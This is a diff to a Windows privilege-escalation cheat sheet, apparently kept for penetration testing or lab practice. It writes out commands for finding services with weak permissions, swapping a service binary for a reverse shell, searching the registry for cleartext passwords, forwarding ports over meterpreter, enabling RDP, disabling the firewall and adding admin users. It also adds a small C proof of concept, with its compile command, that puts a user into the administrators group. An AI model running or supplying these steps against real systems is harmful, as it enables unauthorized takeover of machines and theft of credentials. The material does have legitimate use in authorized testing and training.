@@ -49,10 +49,23 @@ netsh firewall show config*
     *$ tasklist /SVC*
 
 EoP 1: Incorrect permissions in services
-    Get permissions of all services. Services with full access from *BUILTIN\Users(F)* or user/usergroup has (F) or (C) are vulnable to having the binary replaced with malicious binary.
+    If you find a service that has write permissions set to everyone you can change that binary into your custom binary and make it execute in the privileged context.+
+
     Find affected services:
     *$ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
 $ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"*
+
+    If wmic is not available we can use sc.exe:
+    *$ sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt
+FOR /F %i in (Servicenames.txt) DO echo %i
+type Servicenames.txt
+FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
+FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt*
+
+    You can process each service using cacls:
+    *$ cacls "C:\path\to\file.exe"*
+    We are interested in services where we have BUILTIN\Users:(F) or (C) for our group.
+
     Transfer your binary (reverse shell/add your user to admin group).
     then move new old, and restart the service with:
     *$ wmic service NAMEOFSERVICE call startservice
@@ -69,6 +82,8 @@ sc qc upnphost*
     *$ sc config SSDPSRV start= auto
 net start SSDPSRV
 net start upnphost*
+    Or remove the dependency:
+    *$ sc config upnphost depend= ""*
 
 EoP2: Find unquoted paths
     *$ wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """*
@@ -77,8 +92,6 @@ EoP2: Find unquoted paths
     *c:\Program Files\something\winamp.exe*
     We can place a binary like this
     *c:\program.exe*
-
-
 
 EoP3: ClearText passwords (quick hits)
     Search for them
@@ -120,9 +133,8 @@ reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password*
 reg query HKCU /f password /t REG_SZ /s*
 
 
-
 EoP5: Services only available from loopback
-    look for LISTENING/LISTEN
+    You can find services bind to the loopback interface that are not reachable through the network running.look for LISTENING/LISTEN:
     *netstat -ano*
 
     Port forward using plink
@@ -131,8 +143,6 @@ EoP5: Services only available from loopback
     Port forward using meterpreter
     *$ portfwd add -l <attacker port> -p <victim port> -r <victim ip>
 portfwd add -l 3306 -p 3306 -r 192.168.1.101*
-
-
 
     If powershell is blocked, you can download:
     *https://github.com/Ben0xA/nps*
@@ -225,14 +235,6 @@ Exploits worth looking at:
     *https://github.com/SecWiki/windows-kernel-exploits*
 
 Useful commands
-    Enable RDP access
-    *reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
-netsh firewall set service remoteadmin enable
-netsh firewall set service remotedesktop enable*
-
-    Disable firewall
-    *$ netsh firewall set opmode disable*
-
     Add a new user
     *$ net user test 1234 /add
 $ net localgroup administrators test /add*
@@ -240,6 +242,22 @@ $ net localgroup administrators test /add*
     *$ type file*
     Remove file
     *$ del /f file*
+	Change password for user:
+	*$ net user <user> <password>*
+	List users:
+	*$ net user*
+	Info about a user:
+	*$ net user <username>*
+	Permissions on a folder recusively:
+	*$ cacls *.* /t /e /g domainname\administrator:f*
+	tasklist or wmic process or tasklist /svc
+    Enable RDP access
+    *reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
+netsh firewall set service remoteadmin enable
+netsh firewall set service remotedesktop enable*
+    Disable firewall
+    *$ netsh firewall set opmode disable*
+
 
 Transferring files
     with ftp (run ftp.sh in your box):
@@ -304,3 +322,14 @@ Get proof
     Access Check
     You will probably need to accept the eula first:
     *$ accesschk.exe /accepteula*
+
+PoCs
+    Add user to administrator group
+    *#include <stdlib.h>
+int main ()
+{
+int i;
+    i = system("net localgroup administrators theusername /add");
+return 0;
+}*
+    *i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe*
